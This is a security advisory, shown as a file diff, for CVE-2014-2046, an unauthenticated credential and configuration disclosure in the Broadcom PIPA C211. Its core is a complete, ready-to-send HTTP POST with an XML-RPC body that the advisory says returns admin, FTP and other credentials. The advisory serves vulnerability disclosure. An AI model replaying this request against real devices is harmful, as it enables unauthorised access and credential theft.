@@ -1,0 +1,49 @@
+Vulnerability title: Unauthenticated Credential And Configuration
+Retrieval In Broadcom Ltd PIPA C211
+CVE: CVE-2014-2046
+Vendor: Broadcom Ltd
+Product: PIPA C211
+Affected version: Soft Rev: SR1.1, HW Rev: PIPA C211 rev2
+Fixed version: N/A
+Reported by: Jerzy Kramarz
+
+Details:
+
+By sending the following request to the BROADCOM PIPA C211 web interface it is possible to retrieve complete system configuration including administrative credentials, SMTP community strings, FTP upload credentials and all other system user credentials:
+
+POST /cgi-bin/rpcBridge HTTP/1.1
+Host: <IP>
+Proxy-Connection: keep-alive
+Content-Length: 574
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36
+Origin: http://<IP>
+Content-Type: text/xml
+Accept: */*
+DNT: 1
+Referer: http://:<IP>/
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en-US,en;q=0.8,es;q=0.6,pl;q=0.4
+
+<methodCall><methodName>config.getValuesHashExcludePaths</methodName><params><param><value><string>sys</string></value></param><param><value><int>0</int></value></param><param><value><int>0</int></value></param><param><value><array><data><value><string>sys.applications.aptcodec.horizonnextgen.status</string></value><value><string>sys.applications.aptcodec.horizonnextgen.configuration</string></value></data></array></value></param></params></methodCall>
+
+        
+
+Further details at:
+https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2046/
+
+
+Copyright:
+Copyright (c) Portcullis Computer Security Limited 2014, All rights
+reserved worldwide. Permission is hereby granted for the electronic
+redistribution of this information. It is not to be edited or altered in
+any way without the express written consent of Portcullis Computer
+Security Limited.
+
+Disclaimer:
+The information herein contained may change without notice. Use of this
+information constitutes acceptance for use in an AS IS condition. There
+are NO warranties, implied or otherwise, with regard to this information
+or its use. Any use of this information is at the user's risk. In no
+event shall the author/distributor (Portcullis Computer Security
+Limited) be held liable for any damages whatsoever arising out of or in
+connection with the use or spread of this information.
